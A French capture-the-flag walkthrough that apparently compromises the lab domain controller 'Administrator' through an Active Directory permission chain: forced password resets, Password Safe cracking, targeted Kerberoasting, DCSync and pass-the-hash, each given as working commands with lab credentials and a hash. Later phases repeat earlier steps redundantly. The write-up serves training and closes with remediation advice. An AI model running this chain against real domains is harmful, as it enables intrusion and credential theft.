![Cover](cover.png)

### Énumération et Scanning

L'objectif initial est d'identifier la surface d'attaque de la machine **Administrator**, un **Domain Controller** Windows. Je commence par un scan **Nmap** exhaustif pour découvrir les services ouverts.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.42

# Scan détaillé des services identifiés
nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.42
```

Le scan révèle une panoplie de services classiques d'un environnement **Active Directory** :
*   **DNS** (53), **Kerberos** (88), **LDAP** (389/636), **SMB** (445).
*   **WinRM** (5985) : Indique une possibilité de gestion à distance.
*   **FTP** (21) : Service inhabituel sur un **Domain Controller**, à investiguer.

Le nom de domaine identifié via le script **LDAP** est `administrator.htb`. Je mets à jour mon fichier `/etc/hosts` en utilisant **NetExec** pour automatiser la résolution.

```bash
netexec smb 10.10.11.42 --generate-hosts-file /etc/hosts
```

### Vecteur d'Entrée : Credentials Statiques

Dans ce scénario, des identifiants de bas niveau sont fournis : `olivia:ichliebedich`. Je valide ces accès sur les différents services pour déterminer mon point d'entrée.

```bash
# Validation SMB
netexec smb 10.10.11.42 -u olivia -p ichliebedich

# Validation WinRM (Accès privilégié à distance)
netexec winrm 10.10.11.42 -u olivia -p ichliebedich
```

Les tests confirment que l'utilisateur **olivia** a le droit de se connecter via **WinRM** (groupe **Remote Management Users**). Je procède à l'établissement d'un premier shell.

```bash
evil-winrm -i administrator.htb -u olivia -p ichliebedich
```

### Énumération Interne et Bloodhound

Une fois sur la machine, l'énumération locale (fichiers, `inetpub\ftproot`) ne donne rien d'exploitable immédiatement. Je bascule sur une énumération orientée **Active Directory** en utilisant **Bloodhound.py** pour cartographier les relations de confiance et les privilèges.

```bash
bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
```

L'analyse des données dans **Bloodhound** révèle une vulnérabilité critique : l'utilisateur **olivia** possède le privilège **GenericAll** sur l'utilisateur **michael**.

> **Schéma Mental : Abus de GenericAll**
> Le privilège **GenericAll** (Full Control) sur un objet utilisateur permet de modifier n'importe quel attribut de cet objet. Dans un contexte offensif, l'action la plus directe consiste à effectuer un **Password Reset** sur la cible. Contrairement à un changement de mot de passe classique, le privilège **GenericAll** permet de définir un nouveau mot de passe sans connaître l'ancien.

### Escalade de Privilèges : Accès à Michael

J'utilise l'outil `net` pour réinitialiser le mot de passe de **michael** depuis ma machine d'attaque, en utilisant les droits d'**olivia**.

```bash
# Réinitialisation du mot de passe de michael
net rpc password "michael" "P@ssw0rd123!" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
```

Après avoir vérifié que le nouveau mot de passe est valide, je constate que **michael** fait également partie du groupe **Remote Management Users**, ce qui me permet d'obtenir un second shell avec une identité différente.

```bash
# Validation et connexion WinRM
netexec winrm 10.10.11.42 -u michael -p 'P@ssw0rd123!'
evil-winrm -i administrator.htb -u michael -p 'P@ssw0rd123!'
```

Cette transition marque la fin de la brèche initiale et le début de l'escalade latérale au sein du domaine.

---

### Phase 2 : Énumération Interne & Mouvement Latéral

Une fois l'accès initial obtenu avec les identifiants d'**Olivia**, ma priorité est de cartographier les relations de confiance au sein de l'**Active Directory**. N'ayant pas de vecteurs d'exploitation directe sur le système de fichiers, je me concentre sur l'énumération des objets du domaine.

#### 1. Énumération Active Directory (Bloodhound)

J'utilise **bloodhound-python** pour ingérer les données du domaine. Cette étape est cruciale pour identifier les chemins d'attaque non évidents basés sur les **Access Control Entries (ACEs)**.

```bash
# Collecte des données AD
bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
```

L'analyse des données révèle une chaîne de compromission par délégation de droits :
1. **Olivia** possède le droit **GenericAll** sur l'utilisateur **Michael**.
2. **Michael** possède le droit **ForceChangePassword** sur **Benjamin**.
3. **Benjamin** appartient au groupe **Share Moderators**, lui donnant accès au service **FTP**.

> **Schéma Mental : Chaîne d'Abus d'ACL**
> Olivia --[GenericAll]--> Michael --[ForceChangePassword]--> Benjamin --[MemberOf]--> Share Moderators (Accès FTP)

#### 2. Pivot : Michael & Benjamin (Abus de GenericAll)

Le droit **GenericAll** permet un contrôle total sur l'objet cible, y compris la modification de son mot de passe sans connaître l'ancien. J'utilise **net rpc** pour réinitialiser les mots de passe successivement.

```bash
# Reset du password de Michael via Olivia
net rpc password "michael" "P@ssw0rd123!" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42

# Reset du password de Benjamin via Michael
net rpc password "benjamin" "P@ssw0rd123!" -U "administrator.htb"/"michael"%"P@ssw0rd123!" -S 10.10.11.42
```

#### 3. Exfiltration de données : FTP & Password Safe

Avec les accès de **Benjamin**, je me connecte au serveur **FTP** pour inspecter les partages modérés. J'y trouve un fichier de base de données **Password Safe** (`Backup.psafe3`).

```bash
# Connexion FTP et récupération de la DB
ftp 10.10.11.42
get Backup.psafe3
```

Le fichier est protégé par une **Master Password**. Je tente un cassage hors-ligne avec **hashcat** en utilisant le mode spécifique pour **Password Safe v3**.

```bash
# Cracking de la base Password Safe
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

Le mot de passe `tekieromucho` permet d'ouvrir la base de données. J'y récupère les identifiants d'**Emily** : `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`.

#### 4. Mouvement Latéral : Emily vers Ethan (Targeted Kerberoasting)

L'énumération **Bloodhound** indique qu'**Emily** possède le droit **GenericWrite** sur l'utilisateur **Ethan**. Ce droit permet de modifier les attributs de l'objet, notamment le **Service Principal Name (SPN)**.

> **Schéma Mental : Targeted Kerberoasting**
> 1. L'attaquant possède **GenericWrite** sur un utilisateur (Ethan).
> 2. L'attaquant ajoute un **SPN** arbitraire à cet utilisateur.
> 3. L'utilisateur devient "Kerberoastable".
> 4. On demande un **TGS** pour ce service, chiffré avec le hash d'Ethan.
> 5. On cracke le hash hors-ligne pour obtenir le mot de passe d'Ethan.

J'utilise l'outil **targetedKerberoast.py** pour automatiser l'injection du **SPN** et la récupération du ticket.

```bash
# Exécution du Targeted Kerberoasting
python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Le hash récupéré est cassé avec **hashcat** (mode 13100), révélant le mot de passe d'**Ethan** : `limpbizkit`.

#### 5. Compromission Totale : Ethan vers Domain Admin (DCSync)

L'analyse finale des privilèges d'**Ethan** montre qu'il possède les droits **DS-Replication-Get-Changes** et **DS-Replication-Get-Changes-All**. Ces permissions permettent d'effectuer une attaque **DCSync** pour simuler un **Domain Controller** et demander la réplication des secrets du domaine.

```bash
# Extraction des hashes NTDS.dit via DCSync
secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
```

Je récupère le hash **NTLM** de l'**Administrator** du domaine : `3dc553ce4b9fd20bd016e098d2d2fd2e`.

> **Schéma Mental : DCSync Attack**
> Ethan (Privilèges de réplication) -> Demande de réplication au DC -> Le DC envoie les hashes de tous les utilisateurs (y compris l'Admin) -> Authentification via Pass-The-Hash.

#### 6. Accès Final

Il ne reste plus qu'à utiliser la technique **Pass-The-Hash** via **Evil-WinRM** pour obtenir un shell avec les privilèges les plus élevés sur le **Domain Controller**.

```bash
# Connexion finale en tant qu'Administrator
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Une fois l'accès obtenu en tant qu'**Emily**, l'analyse des données **Bloodhound** révèle un chemin critique vers la compromission totale du domaine. **Emily** possède le privilège **GenericWrite** sur l'utilisateur **Ethan**.

#### 1. Compromission d'Ethan : Targeted Kerberoasting

Le privilège **GenericWrite** sur un objet utilisateur permet de modifier ses attributs, notamment le **Service Principal Name (SPN)**. En injectant un **SPN** arbitraire sur le compte d'**Ethan**, je peux transformer ce compte standard en une cible de **Kerberoasting**.

> **Schéma Mental :**
> Emily (`GenericWrite`) ➔ Modification de l'attribut `servicePrincipalName` d'Ethan ➔ Requête **TGS** (Ticket Granting Service) ➔ Extraction du hash du ticket (chiffré avec le mot de passe d'Ethan) ➔ Crack hors-ligne.

J'utilise l'outil **targetedKerberoast.py** pour automatiser l'injection du **SPN**, la récupération du hash et le nettoyage (cleanup) de l'attribut :

```bash
# Synchronisation de l'heure avec le DC (crucial pour Kerberos)
sudo ntpdate administrator.htb

# Exécution de l'attaque ciblée
uv run targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Le script extrait un hash `$krb5tgs$23$*ethan...`. Je procède au cracking avec **hashcat** et la wordlist **rockyou.txt** :

```bash
hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
```

Le mot de passe identifié pour **Ethan** est : `limpbizkit`.

#### 2. Domination du Domaine : Attaque DCSync

L'analyse **Bloodhound** montre qu'**Ethan** dispose des privilèges **DS-Replication-Get-Changes** et **DS-Replication-Get-Changes-All** sur la racine du domaine. Ces droits permettent d'exécuter une attaque **DCSync**.

> **Schéma Mental :**
> Ethan (`DCSync` rights) ➔ Simulation d'un **Domain Controller** via le protocole **MS-DRSR** ➔ Requête de réplication des données sensibles ➔ Extraction des hashes NTLM depuis la base **NTDS.dit**.

J'utilise **secretsdump.py** d'**Impacket** pour dumper les hashes du domaine :

```bash
secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
```

L'outil retourne le hash NTLM du compte **Administrator** :
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::`

#### 3. Accès Final (Pass-the-Hash)

Avec le hash NTLM de l'administrateur du domaine, je peux m'authentifier sans avoir besoin de cracker le mot de passe via une attaque **Pass-the-Hash (PtH)** sur le service **WinRM**.

```bash
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

Je suis désormais **Domain Admin**. Le flag `root.txt` se trouve dans `C:\Users\Administrator\Desktop`.

---

### Analyse Post-Exploitation : Beyond Root

La machine **Administrator** illustre une chaîne de compromission **Active Directory** complexe basée exclusivement sur des abus de privilèges d'objets (ACL/ACE).

1.  **La Chaîne de Confiance Brisée :** L'attaque a suivi un cheminement logique de pivotement horizontal et vertical :
    *   **Olivia** ➔ **Michael** (**GenericAll**) : Contrôle total du compte.
    *   **Michael** ➔ **Benjamin** (**ForceChangePassword**) : Réinitialisation arbitraire.
    *   **Benjamin** ➔ **Emily** (Accès **FTP** vers un **Password Safe**) : Récupération de secrets via un fichier tiers.
    *   **Emily** ➔ **Ethan** (**GenericWrite**) : Vecteur de **Targeted Kerberoasting**.
    *   **Ethan** ➔ **Domain Admin** (**DCSync**) : Compromission totale.

2.  **Vecteurs de Persistance :** En tant que **Domain Admin**, j'aurais pu générer un **Golden Ticket** via le hash du compte **krbtgt** récupéré lors du **DCSync**, garantissant un accès illimité même en cas de changement de mot de passe de l'administrateur.

3.  **Défense et Remédiation :**
    *   **Principe du Moindre Privilège :** Les droits **GenericWrite** et **DCSync** ne devraient jamais être attribués à des comptes d'utilisateurs standards.
    *   **Hygiène des Mots de Passe :** Le succès du **Kerberoasting** sur Ethan et du cracking du **Password Safe** repose sur l'utilisation de mots de passe présents dans des dictionnaires publics.
    *   **Surveillance :** L'utilisation de **DCSync** par un compte non-machine est une alerte critique qui doit être monitorée via les logs d'audit (Event ID 4662).